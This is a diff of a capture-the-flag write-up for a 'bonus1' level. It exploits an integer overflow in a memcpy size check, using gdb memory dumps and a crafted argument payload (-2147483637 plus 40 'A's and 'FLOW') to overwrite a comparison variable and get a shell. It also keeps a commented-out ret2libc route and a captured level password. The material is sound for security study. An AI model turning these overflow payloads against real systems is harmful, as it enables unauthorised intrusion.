@@ -14,7 +14,9 @@ will allow the overflow on an unsigned.
 
 For the overflow we take little bit greater = -1073741803.
 
-The second argument is a string too, which is used by memcpy as a source.
+First thing we tried is to exploit the binary with a ret2libc method.
+
+/*The second argument is a string too, which is used by memcpy as a source.
 So we have to exploit the memcpy with a "ret2libc" method.
 We have to find the offset to control eip.
 
@@ -36,12 +38,19 @@ $ id
 uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+*/
 
 
+This is the second solution :
 
+Same as the fist solution we need to pass the first comparison.
+We need this number to be big enough after the overflow.
+After seeing the memory, we can see the variable of the comparison is 44 bits
+after our buffer.
+This means our argv1 multiplied by 4 should be equal or more to 44.
 
-
-
+./a.out -2147483637
+-2147483637 -> 44
 
 (gdb) r "3" "$(python -c 'print "A" * 40')"
 The program being debugged has been started already.
@@ -54,7 +63,7 @@ Breakpoint 1, 0x08048480 in main ()
 0xbffff680:	0xbffff694	0xbffff8b3	0x0000000c	0x080482fd
 0xbffff690:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
 0xbffff6a0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
-0xbffff6b0:	0xb7fed280	0x00000000	0x080484b9	0x00000003 <= here we can see val cmp
+0xbffff6b0:	0xb7fed280	0x00000000	0x080484b9	0x00000003 <= this is where the comparison value is stocked ($esp + 0x3c)
 0xbffff6c0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
 0xbffff6d0:	0x00000003	0xbffff764	0xbffff774	0xb7fdc858
 0xbffff6e0:	0x00000000	0xbffff71c	0xbffff774	0x00000000
@@ -62,10 +71,6 @@ Breakpoint 1, 0x08048480 in main ()
 
 (gdb) x/4x $esp + 0x3c
 0xbffff6bc:	0x00000003	0x080484b0	0x00000000	0x00000000
-
-Grace au scipt on trouve = -2147483637 = 44 
-
-
 
 (gdb) r "-2147483637" "$(python -c 'print "A" * 50 ')"
 
@@ -80,11 +85,17 @@ Breakpoint 1, 0x08048480 in main ()
 0xbffff6d0:	0x00000000	0xbffff71c	0xbffff764	0x00000000
 0xbffff6e0:	0x0804821c	0xb7fd0ff4	0x00000000	0x00000000
 
+By sending too much "A" $esp + 0x3c is overwritten
+
 (gdb) x/4x $esp + 0x3c
 0xbffff6ac:	0x41414141	0x080484b0	0x00000000	0x00000000
 
+So we need to send 44 - HEX VALUE = 44 - 4 = 40
 
 (gdb) r "-2147483637" "$(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')"
 
 (gdb) x/x $esp + 0x3c
 0xbffff6ac:	0x574f4c46
+
+In memory the value is stocked at the perfect place and the comparison in the
+binary is passed and we get a shell.
